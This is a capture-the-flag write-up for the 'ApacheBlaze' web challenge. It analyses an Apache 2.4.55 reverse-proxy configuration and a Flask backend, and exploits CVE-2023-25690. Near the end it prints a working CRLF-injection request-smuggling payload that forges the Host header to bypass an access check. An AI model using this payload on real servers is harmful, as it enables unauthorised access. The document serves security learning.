---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: ApacheBlaze

It is a simple web application, you click and some text will pop-up.

By inspecting the backend, I can see, that there is actualy an API (`web_apacheblaze/challenge/backend/src/app.py`) that returns a message, given what game is requested. And by the look of things, that is also a way to get the flag.

```
elif game == 'click_topia':
	if request.headers.get('X-Forwarded-Host') == 'dev.apacheblaze.local':
		return jsonify({
			'message': f'{app.config["FLAG"]}'
		}), 200
```

So I need to request the `click_topia` with `X-Forwarded-Host` being `dev.apacheblaze.local`.

Unfortunelly, simply adding the header does not work.

```
GET /api/games/click_topia HTTP/1.1
Host: 159.65.20.166:30752
X-Forwarded-Host: dev.apacheblaze.local
```

## Apache

There is are also other things. Mainly Apache webserver acting like a proxy.

```
ServerName _
ServerTokens Prod
ServerSignature Off

Listen 8080
Listen 1337

ErrorLog "/usr/local/apache2/logs/error.log"
CustomLog "/usr/local/apache2/logs/access.log" common

LoadModule rewrite_module modules/mod_rewrite.so
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so
LoadModule proxy_balancer_module modules/mod_proxy_balancer.so
LoadModule slotmem_shm_module modules/mod_slotmem_shm.so
LoadModule lbmethod_byrequests_module modules/mod_lbmethod_byrequests.so

<VirtualHost *:1337>

    ServerName _

    DocumentRoot /usr/local/apache2/htdocs

    RewriteEngine on

    RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
    ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"

</VirtualHost>

<VirtualHost *:8080>

    ServerName _

    ProxyPass / balancer://mycluster/
    ProxyPassReverse / balancer://mycluster/

    <Proxy balancer://mycluster>
        BalancerMember http://127.0.0.1:8081 route=127.0.0.1
        BalancerMember http://127.0.0.1:8082 route=127.0.0.1
        ProxySet stickysession=ROUTEID
        ProxySet lbmethod=byrequests
    </Proxy>

</VirtualHost>
```

First virtual host is doing some shenanigans with URL rewriting (makes sense, as I am requesting `/api/games/<GAME>` and the API endpoints are `/?game=<GAME>`). And the second is load ballancer.

Let's check the documentation on the `X-Forwarded-Host` header: https://httpd.apache.org/docs/2.4/mod/mod_proxy.html

```
When acting in a reverse-proxy mode (using the ProxyPass directive, for example), mod_proxy_http adds several request headers in order to pass information to the origin server. These headers are:

X-Forwarded-For
    The IP address of the client.
X-Forwarded-Host
    The original host requested by the client in the Host HTTP request header.
X-Forwarded-Server
    The hostname of the proxy server.

Be careful when using these headers on the origin server, since they will contain more than one (comma-separated) value if the original request already contained one of these headers. For example, you can use %{X-Forwarded-For}i in the log format string of the origin server to log the original clients IP address, but you may get more than one address if the request passes through several proxies.

See also the ProxyPreserveHost and ProxyVia directives, which control other request headers.

Note: If you need to specify custom request headers to be added to the forwarded request, use the RequestHeader directive.
```

Ok, so the passes of the proxy shall be recorded, that's why it is not working.

I can also run the code locally (it is docker after all) and see what is happening. For example, if I modify it do dump the header:

```
{"message":"This game is currently available only from dev.apacheblaze.local. Here are the headers: dev.apacheblaze.local, 159.65.20.166:30752, 127.0.0.1:8080"}
```

### CVE-2023-25690

Let's look around. The apache version is `2.4.55`, which is apparent from `Dockerfile`:

```
RUN wget https://archive.apache.org/dist/httpd/httpd-2.4.55.tar.gz && tar -xvf httpd-2.4.55.tar.gz
```

And there is a CVE for this version https://github.com/dhmosfunk/CVE-2023-25690-POC

It allows for request smuggling if there is mod_proxy combined by specific rewriting. Like this:

```
RewriteEngine on 
RewriteRule "^/here/(.*)" "http://example.com:8080/elsewhere?$1"; [P] 
ProxyPassReverse /here/ http://example.com:8080/
```

And that is exactly our case!

```
RewriteRule "^/api/games/(.*)" "http://127.0.0.1:8080/?game=$1" [P]
ProxyPassReverse "/" "http://127.0.0.1:8080:/api/games/"
```

OK, so with that I sould be able to smuggle a request that bypasses the proxy and goes directly to the app. I will follow the git writeup.

## Exploit

OK, so I will try to smuggle the request, so I request two games.

```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/%3Fgame%3Dhyper_clicker HTTP/1.1
Host: 159.65.20.166:30752
```

By looking at the logs (I am trying it locally), I can see that two requests are going throught.

```
[pid: 97|app: 0|req: 1/3] 127.0.0.1 () {28 vars in 363 bytes} [Fri Jan  5 18:30:30 2024] GET /?game=click_topia => generated 112 bytes in 8 msecs (HTTP/1.1 200) 2 headers in 72 bytes (1 switches on core 0)
[pid: 101|app: 0|req: 1/4] 127.0.0.1 () {28 vars in 408 bytes} [Fri Jan  5 18:30:30 2024] GET /?game=hyper_clicker => generated 78 bytes in 11 msecs (HTTP/1.1 200) 2 headers in 71 bytes (1 switches on core 0)
```

However there is a problem as I receive only one response, the other gets discarted. Here I spend a lot of time figuring out what to do.

But the solution is easy. The first request gets executed and returned. OK. That is the one that gets rewriten and proxied through (thanks to `[P]` flag). But there I can actually control what will be the **original host**.

`Host: 159.65.20.166:30752` is in the "second" request, and is first recoginised by the proxy. It is router to the `*:1337` virtual host. There, after rewriting, it splits into two requests, while the original `Host` header belonging to the second (discarted).

So, all I have to do it to have the correct `Host` header in the first request **after** the split.

```
GET /api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/%3Fgame%3Dhyper_clicker HTTP/1.1
Host: 159.65.20.166:30752

```

Which totaly works!